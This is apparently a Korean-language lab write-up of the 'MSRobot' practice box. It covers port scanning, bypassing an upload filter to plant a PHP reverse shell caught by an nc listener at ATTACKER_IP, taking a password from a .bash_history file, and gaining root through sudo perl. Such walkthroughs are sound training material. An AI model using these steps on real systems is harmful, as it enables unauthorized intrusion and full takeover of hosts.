---
title: '[BHPT] MSRobot'
layout: post
date: 2026-11-09 12:00:00 +0900
featured: /assets/images/redraccoon-logo.png
---

# 7.MSRobot 모의해킹

## 점검환경

분석 기간 | 호스트 이름 | IP주소 | 점검자
---|:---:|---:|---:
2025년 12월 5일 ~ 2025년 12월 6일 | MSRobot | TARGET_IP | 진엽

## 모의해킹 수행 내용
### 정보 수집
대상 호스트의 아이피주소를 상대로 모든 TCP 포트들의 상태를 알아보기 위해 TCP SYN 스캔을 이용해 포트스캐닝을 진행했다.
```
└─$ sudo nmap -sS -p- --max-retries 1 -Pn -n --open TARGET_IP --min-rate 1500 -oA fullport
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 09:33 EST
Nmap scan report for TARGET_IP
Host is up (0.0077s latency).
Not shown: 65531 filtered tcp ports (no-response), 2 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 87.55 seconds
```

포트 스캔 결과 포트 22, 80이 열려있었고, 다른 포트들은 모두 닫히거나 필터링 된 상태였다. 해당 포트에서 어떤 종류의 네트워크 서비스들이 실행중인지 알아보기 위해 서비스 배너 그래빙과 Nmap 기본 스크립트를 이용해 더 자세한 정보 수집을 진행했다.
```
└─$ nmap -p 22,80 -sV -sC -Pn --open TARGET_IP -oA tcpDetailed               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 09:36 EST
Nmap scan report for TARGET_IP
Host is up (0.0073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2d:12:c3:0f:93:58:63:e5:fa:b1:d8:b0:c9:21:44:66 (ECDSA)
|_  256 9e:28:89:81:d7:80:68:63:13:56:79:d7:24:63:98:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: \xEB\xA0\x88\xEB\x93\x9C\xEB\x9D\xBC\xEC\xBF\xA4\xEC\xBD\x94\xEC\x9D\xB8 RedRaccoon Coin
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.45 seconds
```

포트 스캔을 통해 정보를 얻지 못하여 페이지에 직접 접속 후 소스코드 분석 해보니 파일 업로드 URL를 발견했다.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-msrobot/image.png)

주석 제거 후 지원하기 링크 클릭하면, 파일 업로드 페이지가 접근됨.
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-msrobot/image-1.png)
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-msrobot/image-2.png)

PDF, DOCX, DOC 파일만 업로드가 가능하였지만 Content-Type과 PDF파일이름에 .php 확장자를 추가하하면 정상적으로 업로드가 가능하였으며, 디렉토리 브루트포스를 이용하여 얻은 /uploads 경로를 통해 업로드한 리버스쉘 php파일을 실행시켰음. 
![alt text]({{ site.baseurl }}/assets/images/bhpt/bhpt-msrobot/image-3.png)
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9988
listening on [any] 9988 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 51406
Linux ip-172-31-156-43 6.2.0-1012-aws #12~22.04.1-Ubuntu SMP Thu Sep  7 14:01:24 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 16:20:19 up  1:52,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

home 디렉토리에 mrrobot 홈 디렉토리를 확인했으며, 해당 계정의 .bash_history 열람 시 mrrobot 계정과 [REDACTED_PASSWORD]를 확인 할 수 있음.
```
$ cd home
$ ls
mrrobot
msrobot
ubuntu
$ cd msrobot
$ cat .bash_history
sshpass -p '[REDACTED_PASSWORD]' mrrobot@localhost -vv
```

mrrobot로 로그인 후 쉘 업그레이드 진행.
```
$ su mrrobot                                                    
Password: [REDACTED_PASSWORD]
id
uid=1002(mrrobot) gid=1002(mrrobot) groups=1002(mrrobot)
python3 -c 'import pty;pty.spawn("/bin/bash")'
mrrobot@ip-172-31-156-43:/home/msrobot$ ^Z                                                              
zsh: suspended  nc -lvnp 9988                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 9988
                               reset
reset: unknown terminal type unknown
Terminal type? xterm
mrrobot@ip-172-31-156-43:/home/msrobot$ export TERM=xterm-256color
```

sudo -l 명령을 통해 root 권한으로 perl 명령어를 실행 할 수 있는 것을 확인하였으며, -e 옵션을 이용하여 root 권한의 쉘을 얻는 것을 성공함.
```
mrrobot@ip-172-31-156-43:/home/msrobot$ sudo -l
Matching Defaults entries for mrrobot on ip-172-31-156-43:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mrrobot may run the following commands on ip-172-31-156-43:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
mrrobot@ip-172-31-156-43:/home/msrobot$ sudo perl -e 'exec "/bin/sh";'
# id
uid=0(root) gid=0(root) groups=0(root)
```


